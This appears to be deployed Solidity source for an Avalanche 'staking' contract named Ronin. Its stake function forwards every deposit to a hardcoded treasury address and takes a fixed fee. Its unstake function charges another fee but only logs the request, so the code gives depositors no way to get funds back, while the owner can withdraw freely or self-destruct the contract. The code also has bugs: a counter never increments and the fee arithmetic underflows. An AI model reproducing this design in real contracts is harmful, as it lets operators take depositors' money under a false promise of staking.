/**
 *Submitted for verification at snowtrace.io on 2021-12-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.13;

contract Ronin {

    address payable public owner;
    address payable public tresury = 0xcD14a0db9e3AD695b3226c3e7264cCBe1da5EBed; 
    address payable public feeCollector = 0x59c0f4Bea65c99C281A0107C86beE309b20b3B49;
    address public smartContractAddress = address(this);
    address payable public currentUser = address(msg.sender);
    uint public transactionNumber;
    uint public fundsReceived;
    bool public paused;
    struct Payment {
        address sender;
        uint amount;
        uint fee;
        uint principal;
        uint timestamp;
        uint transactionNumber;
    }
    struct UnstakingRequest {
        address sender;
        uint fee;
        uint timestamp;
        uint transactionNumber;
    }
    mapping(address => Payment[]) public stakeMap;
    mapping(address => UnstakingRequest[]) public unstakeMap;
    constructor() public{
        owner = msg.sender;
    }

    function pause(bool _bool) public {
        require(owner == msg.sender, 'You are not the owner!!!');
        paused = _bool;
    }

    function destroySmartContract(address payable _liquitdateTo) public {
        require(owner == msg.sender, 'You are not the owner!!!');
        require(paused == true, 'Contract Status: Not-Paused - Must first pause!!!');
        selfdestruct(_liquitdateTo);
    }

    function stake() public payable {
        fundsReceived += msg.value;
        feeCollector.transfer(100000000000000000);
        tresury.transfer(address(this).balance);
        Payment[] storage payment = stakeMap[msg.sender];
        payment.push(Payment({sender: msg.sender, amount: msg.value, fee: 100000000000000000, principal: msg.value - 100000000000000000, timestamp: block.timestamp, transactionNumber: transactionNumber}));
        stakeMap[msg.sender] = payment;
    }

    function withdrow(address payable to, uint amount) public payable {
        require(owner == msg.sender, 'You are not the owner!!!');
        to.transfer(amount);
    }

    function unstakeRequest() public payable {
        require(msg.value == 100000000000000000, 'Withdorwal Fee Amount 0.1 AVAX');
        feeCollector.transfer(100000000000000000);
        UnstakingRequest[] storage unstake = unstakeMap[msg.sender];
        unstake.push(UnstakingRequest({sender: msg.sender, fee: 100000000000000000, timestamp: block.timestamp, transactionNumber: transactionNumber}));
        unstakeMap[msg.sender] = unstake;
    }

    function getBalance() public view returns(uint) {
        return msg.sender.balance;
    }

    function getCurrentUser() public view returns(address) {
        return msg.sender;
    }

    function checkNumberOfUserPayments(address addr) public view returns(uint) {
        return stakeMap[addr].length;
    }
    
    function checkNumberOfUnstakeRequest(address addr) public view returns(uint) {
        return unstakeMap[addr].length;
    }

}